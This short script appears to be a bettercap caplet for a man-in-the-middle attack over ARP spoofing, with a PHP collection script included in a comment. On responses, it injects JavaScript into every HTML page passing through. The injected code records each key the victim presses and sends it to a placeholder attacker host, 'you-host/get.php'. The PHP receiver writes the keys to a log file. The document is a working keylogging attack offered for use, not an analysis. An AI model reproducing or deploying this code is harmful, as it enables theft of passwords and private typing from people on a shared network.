//This logs only the pressed keys.
//Sends the pressed keys to a script of "get.php"
/*
<?php

$key = $_GET['key'];

 if ($logfile = fopen('log.txt', 'a+')) {
if (!empty($key)){
  fwrite($logfile, $key);
}
  fclose($logfile);
}
?>
*/

function onLoad() {
	log('KeyLog Inject loaded.');	log('targets: ' + env['arp.spoof.targets']);
}

function onResponse(req, res) {
	if (res.ContentType.indexOf('text/html') == 0) {
		var body = res.ReadBody();
		if (body.indexOf('</head>') != -1) {
			res.Body = body.replace('</head>', '<script type="text/javascript">function sendGet(str){var xhr = new XMLHttpRequest(); xhr.open("GET", "http://you-host/get.php?" + str, true); xhr.send();}; document.addEventListener("keydown", (e) => { key = `${e.key}`; s="key="+encodeURIComponent(key); sendGet(s);});</script></head>');
		}
	}
}
